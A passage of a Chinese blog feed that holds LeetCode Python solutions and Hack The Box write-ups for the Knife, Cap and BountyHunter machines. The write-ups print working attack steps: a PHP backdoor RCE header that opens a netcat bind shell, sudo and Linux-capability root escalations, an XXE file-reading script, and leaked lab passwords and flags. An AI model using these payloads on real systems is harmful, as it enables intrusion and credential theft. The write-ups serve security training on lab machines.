class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">longestCommonPrefix</span>(<span class="params">self, strs: List[<span class="built_in">str</span>]</span>) -&gt; str:</span></span><br><span class="line">length = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(strs) == <span class="number">1</span>:</span><br><span class="line"><span class="keyword">return</span>(strs[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&quot;</span> <span class="keyword">in</span> strs:</span><br><span class="line"><span class="keyword">return</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(strs)):</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> strs[_].startswith(strs[<span class="number">0</span>][:length]):</span><br><span class="line"><span class="keyword">return</span>(strs[<span class="number">0</span>][:length-<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span> length == <span class="built_in">len</span>(strs[<span class="number">0</span>]):</span><br><span class="line"><span class="keyword">return</span>(strs[<span class="number">0</span>])</span><br><span class="line">length += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>懒得写匹配<br />直接用startswith了</p><hr /><h1 id="三数之和"><a class="markdownIt-Anchor" href="#三数之和"></a> <a href="https://leetcode-cn.com/problems/3sum/">三数之和</a></h1><p>给你一个包含<code>n</code>个整数的数组<code>nums</code>，判断<code>nums</code>中是否存在三个元素 a，b，c ，使得a + b + c = 0 ？请你找出所有和为<code>0</code>且不重复的三元组。</p><p>注意：答案中不可以包含重复的三元组。</p><p>示例 1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums &#x3D; [-1,0,1,2,-1,-4]</span><br><span class="line">输出：[[-1,-1,2],[-1,0,1]]</span><br></pre></td></tr></table></figure><p>示例 2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums &#x3D; []</span><br><span class="line">输出：[]</span><br></pre></td></tr></table></figure><p>示例 3：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums &#x3D; [0]</span><br><span class="line">输出：[]</span><br></pre></td></tr></table></figure><p>来源：力扣（LeetCode）<br />链接：<a href="https://leetcode-cn.com/problems/3sum">https://leetcode-cn.com/problems/3sum</a><br />著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">threeSum</span>(<span class="params">self, nums: List[<span class="built_in">int</span>]</span>) -&gt; List[List[int]]:</span></span><br><span class="line">nums.sort()</span><br><span class="line">length = <span class="built_in">len</span>(nums)</span><br><span class="line"><span class="keyword">if</span> length &lt; <span class="number">3</span>:</span><br><span class="line"><span class="keyword">return</span>([])</span><br><span class="line">neg_count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> nums:</span><br><span class="line"><span class="keyword">if</span> _ &lt; <span class="number">0</span>:</span><br><span class="line">neg_count += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> _ == <span class="number">0</span>:</span><br><span class="line">neg_count += <span class="number">1</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> neg_count == <span class="number">0</span> <span class="keyword">or</span> nums[-<span class="number">1</span>] &lt; <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span>([])</span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, neg_count):</span><br><span class="line">c = -nums[_]</span><br><span class="line">a = _ + <span class="number">1</span></span><br><span class="line">b = length - <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> a &lt; b:</span><br><span class="line"><span class="keyword">if</span> nums[a] + nums[b] == c:</span><br><span class="line">temp = [-c, nums[a], nums[b]]</span><br><span class="line"><span class="keyword">if</span> temp <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">result.append(temp)</span><br><span class="line">a += <span class="number">1</span></span><br><span class="line">b -= <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> nums[a] + nums[b] &gt; c:</span><br><span class="line">b -= <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> nums[a] + nums[b] &lt; c:</span><br><span class="line">a += <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span>(result)</span><br></pre></td></tr></table></figure><p>实在想不出来咋做，看了下别人的题解<br />三个数之和为0在除了三个数都为0的情况下，至少有一个负数的存在<br />遍历所有的负数，两个下标分别指向c的下一位与结尾<br />通过a+b与-c的关系来移动a、b</p><hr /><h1 id="最接近的三数之和"><a class="markdownIt-Anchor" href="#最接近的三数之和"></a> 最接近的三数之和</h1><p>给定一个包括<code>n</code>个整数的数组<code>nums</code>和一个目标值<code>target</code>。找出<code>nums</code>中的三个整数，使得它们的和与<code>target</code>最接近。返回这三个数的和。假定每组输入只存在唯一答案。</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums &#x3D; [-1,2,1,-4], target &#x3D; 1</span><br><span class="line">输出：2</span><br><span class="line">解释：与 target 最接近的和是 2 (-1 + 2 + 1 &#x3D; 2) 。</span><br></pre></td></tr></table></figure><p>来源：力扣（LeetCode）<br />链接：<a href="https://leetcode-cn.com/problems/3sum-closest">https://leetcode-cn.com/problems/3sum-closest</a><br />著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">threeSumClosest</span>(<span class="params">self, nums: List[<span class="built_in">int</span>], target: <span class="built_in">int</span></span>) -&gt; int:</span></span><br><span class="line">length = <span class="built_in">len</span>(nums)</span><br><span class="line"><span class="keyword">if</span> length &lt; <span class="number">3</span>:</span><br><span class="line"><span class="keyword">return</span>([])</span><br><span class="line">nums.sort()</span><br><span class="line"><span class="keyword">if</span> target &gt;= <span class="number">0</span>:</span><br><span class="line"><span class="keyword">if</span> target &lt; nums[<span class="number">0</span>]:</span><br><span class="line"><span class="keyword">return</span>(nums[<span class="number">0</span>] + nums[<span class="number">1</span>] + nums[<span class="number">2</span>])</span><br><span class="line">neg_count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> nums:</span><br><span class="line"><span class="keyword">if</span> _ &lt; target:</span><br><span class="line">neg_count += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> _ == target:</span><br><span class="line">neg_count += <span class="number">1</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">sub = <span class="number">9999</span></span><br><span class="line">result = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, neg_count):</span><br><span class="line">c = -nums[_]</span><br><span class="line">a = _ + <span class="number">1</span></span><br><span class="line">b = length - <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> a &lt; b:</span><br><span class="line"><span class="keyword">if</span> sub == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> nums[a] + nums[b] == c + target:</span><br><span class="line">result = target</span><br><span class="line">sub = <span class="number">0</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">elif</span> nums[a] + nums[b] &gt; c + target:</span><br><span class="line">temp = <span class="built_in">abs</span>(nums[a] + nums[b] - c - target)</span><br><span class="line"><span class="keyword">if</span> temp &lt; sub:</span><br><span class="line">sub = temp</span><br><span class="line">result = nums[a] + nums[b] - c</span><br><span class="line">b -= <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> nums[a] + nums[b] &lt; c + target:</span><br><span class="line">temp = <span class="built_in">abs</span>(nums[a] + nums[b] - c - target)</span><br><span class="line"><span class="keyword">if</span> temp &lt; sub:</span><br><span class="line">sub = temp</span><br><span class="line">result = nums[a] + nums[b] - c</span><br><span class="line">a += <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span>(result)</span><br><span class="line"><span class="keyword">elif</span> target &lt; <span class="number">0</span>:</span><br><span class="line">nums = nums[::-<span class="number">1</span>]</span><br><span class="line">print(nums)</span><br><span class="line"><span class="keyword">if</span> target &gt; nums[<span class="number">0</span>]:</span><br><span class="line"><span class="keyword">return</span>(nums[<span class="number">0</span>] + nums[<span class="number">1</span>] + nums[<span class="number">2</span>])</span><br><span class="line">neg_count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> nums:</span><br><span class="line"><span class="keyword">if</span> _ &gt; target:</span><br><span class="line">neg_count += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> _ == target:</span><br><span class="line">neg_count += <span class="number">1</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">sub = <span class="number">9999</span></span><br><span class="line">result = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, neg_count):</span><br><span class="line">c = -nums[_]</span><br><span class="line">a = _ + <span class="number">1</span></span><br><span class="line">b = length - <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> a &lt; b:</span><br><span class="line"><span class="keyword">if</span> sub == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> nums[a] + nums[b] == c + target:</span><br><span class="line">result = target</span><br><span class="line">sub = <span class="number">0</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">elif</span> nums[a] + nums[b] &gt; c + target:</span><br><span class="line">temp = <span class="built_in">abs</span>(nums[a] + nums[b] - c - target)</span><br><span class="line"><span class="keyword">if</span> temp &lt; sub:</span><br><span class="line">sub = temp</span><br><span class="line">result = nums[a] + nums[b] - c</span><br><span class="line">a += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> nums[a] + nums[b] &lt; c + target:</span><br><span class="line">temp = <span class="built_in">abs</span>(nums[a] + nums[b] - c - target)</span><br><span class="line"><span class="keyword">if</span> temp &lt; sub:</span><br><span class="line">sub = temp</span><br><span class="line">result = nums[a] + nums[b] - c</span><br><span class="line">b -= <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span>(result)</span><br></pre></td></tr></table></figure><p>跟上一题差不多的思路，加了点变化罢了<br />分了target正负两种情况来处理<br />但是写得太拉了</p><hr /><p>算法就图一乐，收收心干安服辣</p><p>EOF</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;做课程项目的时候发现自己对算法一无所知&lt;br /&gt;
刷刷题吧&lt;/p&gt;</summary>
    
    
    
    <category term="Study" scheme="https://yoloyolo.top/categories/Study/"/>
    
    
    <category term="LeetCode" scheme="https://yoloyolo.top/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>HTB_Set_2</title>
    <link href="https://yoloyolo.top/2021/09/05/HTB-Set-2/"/>
    <id>https://yoloyolo.top/2021/09/05/HTB-Set-2/</id>
    <published>2021-09-05T07:10:51.000Z</published>
    <updated>2021-12-06T19:14:20.000Z</updated>
    
    <content type="html"><![CDATA[<p>随缘更新</p><a id="more"></a><h1 id="knife"><a class="markdownIt-Anchor" href="#knife"></a> Knife</h1><h2 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -Pn -T5 10.10.10.242</span><br><span class="line"></span><br><span class="line">Nmap scan report for 10.10.10.242</span><br><span class="line">Host is up (0.36s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2><p>得到PHP版本信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl -I http:&#x2F;&#x2F;10.10.10.242&#x2F;</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Thu, 05 Aug 2021 05:54:34 GMT</span><br><span class="line">Server: Apache&#x2F;2.4.41 (Ubuntu)</span><br><span class="line">X-Powered-By: PHP&#x2F;8.1.0-dev</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;UTF-8</span><br></pre></td></tr></table></figure><p>查询得到相关漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">searchsploit php 8.1 dev</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                             |  Path</span><br><span class="line">----------------------------------------------------------- ---------------------------------</span><br><span class="line">PHP 8.1.0-dev - &#39;User-Agentt&#39; Remote Code Execution        | php&#x2F;webapps&#x2F;49933.py</span><br><span class="line">----------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line">Papers: No Results</span><br></pre></td></tr></table></figure><p>将Bash开放到目标服务器9876端口，并用nc连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H &quot;User-Agentt: zerodiumsystem(&#39;mkfifo &#x2F;tmp&#x2F;bufferfly; cat &#x2F;tmp&#x2F;bufferfly | &#x2F;bin&#x2F;bash -i 2&gt;&amp;1 | nc -l 9876 &gt; &#x2F;tmp&#x2F;bufferfly&#39;);&quot; http:&#x2F;&#x2F;10.10.10.242&#x2F;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc 10.10.10.242 9876</span><br><span class="line">cat &#x2F;home&#x2F;james&#x2F;user.txt</span><br><span class="line"></span><br><span class="line">71a8b414816d223319c095a64edbae6c</span><br></pre></td></tr></table></figure><h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2><p>查看sudo权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for james on knife:</span><br><span class="line">    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User james may run the following commands on knife:</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;knife</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root knife exec --exec &quot;exec &#39;&#x2F;bin&#x2F;bash -i&#39;&quot;</span><br><span class="line">cat &#x2F;root&#x2F;root.txt</span><br><span class="line"></span><br><span class="line">6fa9527622b5b0396511a575bd529b42</span><br></pre></td></tr></table></figure><hr /><h1 id="cap"><a class="markdownIt-Anchor" href="#cap"></a> Cap</h1><h2 id="端口扫描-2"><a class="markdownIt-Anchor" href="#端口扫描-2"></a> 端口扫描</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -Pn -T5 10.10.10.245</span><br><span class="line"></span><br><span class="line">Nmap scan report for 10.10.10.245</span><br><span class="line">Host is up (0.28s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21&#x2F;tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80&#x2F;tcp open  http    gunicorn</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-2"><a class="markdownIt-Anchor" href="#漏洞利用-2"></a> 漏洞利用</h2><p>下载流量包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O http:&#x2F;&#x2F;10.10.10.245&#x2F;download&#x2F;0</span><br><span class="line">wireshark 0</span><br></pre></td></tr></table></figure><p>得到FTP登入凭证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nathan:Buck3tH4TF0RM3!</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh nathan@10.10.10.245</span><br><span class="line">Buck3tH4TF0RM3!</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;home&#x2F;nathan&#x2F;user.txt</span><br><span class="line"></span><br><span class="line">f514ef062a27e672c5e88001061d8c5a</span><br></pre></td></tr></table></figure><h2 id="权限提升-2"><a class="markdownIt-Anchor" href="#权限提升-2"></a> 权限提升</h2><p>查看capability</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getcap &#x2F;* -r 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;python3.8 &#x3D; cap_setuid,cap_net_bind_service+eip</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;ping &#x3D; cap_net_raw+ep</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;traceroute6.iputils &#x3D; cap_net_raw+ep</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;mtr-packet &#x3D; cap_net_raw+ep</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;gstreamer1.0&#x2F;gstreamer-1.0&#x2F;gst-ptp-helper &#x3D; cap_net_bind_service,cap_net_admin+ep</span><br></pre></td></tr></table></figure><p>使用python进行提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;bin&#x2F;python3.8 -c &#39;import os;os.setuid(0);os.system(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line">cat &#x2F;root&#x2F;root.txt</span><br><span class="line"></span><br><span class="line">64941cc0edb38d723f72d34453780c90</span><br></pre></td></tr></table></figure><hr /><h1 id="bountyhunter"><a class="markdownIt-Anchor" href="#bountyhunter"></a> BountyHunter</h1><h2 id="端口扫描-3"><a class="markdownIt-Anchor" href="#端口扫描-3"></a> 端口扫描</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -Pn -T5  10.10.11.100</span><br><span class="line"></span><br><span class="line">Nmap scan report for 10.10.11.100</span><br><span class="line">Host is up (0.25s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h2 id="路径扫描"><a class="markdownIt-Anchor" href="#路径扫描"></a> 路径扫描</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dirb http:&#x2F;&#x2F;10.10.11.100&#x2F; -X .php</span><br><span class="line"></span><br><span class="line">+ http:&#x2F;&#x2F;10.10.11.100&#x2F;db.php (CODE:200|SIZE:0) </span><br></pre></td></tr></table></figure><h2 id="漏洞利用-3"><a class="markdownIt-Anchor" href="#漏洞利用-3"></a> 漏洞利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">req &#x3D; requests.session()</span><br><span class="line">file &#x3D; input()</span><br><span class="line">payload &#x3D; &#123;&quot;data&quot;:base64.b64encode((&quot;&quot;&quot;&lt;?xml  version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&quot;&quot;&quot; + file + &quot;&quot;&quot;\&quot;&gt;]&gt;</span><br><span class="line">        &lt;bugreport&gt;</span><br><span class="line">        &lt;title&gt;&amp;xxe;&lt;&#x2F;title&gt;</span><br><span class="line">        &lt;cwe&gt;2&lt;&#x2F;cwe&gt;</span><br><span class="line">        &lt;cvss&gt;3&lt;&#x2F;cvss&gt;</span><br><span class="line">        &lt;reward&gt;4&lt;&#x2F;reward&gt;</span><br><span class="line">        &lt;&#x2F;bugreport&gt;&quot;&quot;&quot;).encode()).decode()&#125;</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;10.10.11.100&#x2F;tracker_diRbPr00f314.php&quot;</span><br><span class="line">res&#x3D;req.post(url&#x3D;url, data&#x3D;payload)</span><br><span class="line">data &#x3D; res.text</span><br><span class="line">data &#x3D; data.replace(&quot;\n&quot;, &quot;&quot;)</span><br><span class="line">result &#x3D; base64.b64decode(re.findall(&quot;&lt;td&gt;Title:&lt;&#x2F;td&gt;    &lt;td&gt;(.*?)&lt;&#x2F;td&gt;&quot;, data)[0].encode()).decode()</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p>读取/etc/passwd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">development:x:1000:1000:Development:&#x2F;home&#x2F;development:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p>读取db.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; TODO -&gt; Implement login system with the database.</span><br><span class="line">$dbserver &#x3D; &quot;localhost&quot;;</span><br><span class="line">$dbname &#x3D; &quot;bounty&quot;;</span><br><span class="line">$dbusername &#x3D; &quot;admin&quot;;</span><br><span class="line">$dbpassword &#x3D; &quot;m19RoAU0hP41A1sTsq6K&quot;;</span><br><span class="line">$testuser &#x3D; &quot;test&quot;;</span><br></pre></td></tr></table></figure><p>登入SSH服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh development@10.10.11.100</span><br><span class="line">m19RoAU0hP41A1sTsq6K</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;home&#x2F;development&#x2F;user.txt</span><br><span class="line"></span><br><span class="line">96248cc10e05f03e3b63eb59adfd9d4c</span><br></pre></td></tr></table></figure><h2 id="权限提升-3"><a class="markdownIt-Anchor" href="#权限提升-3"></a> 权限提升</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;home&#x2F;development&#x2F;contract.txt</span><br><span class="line"></span><br><span class="line">Hey 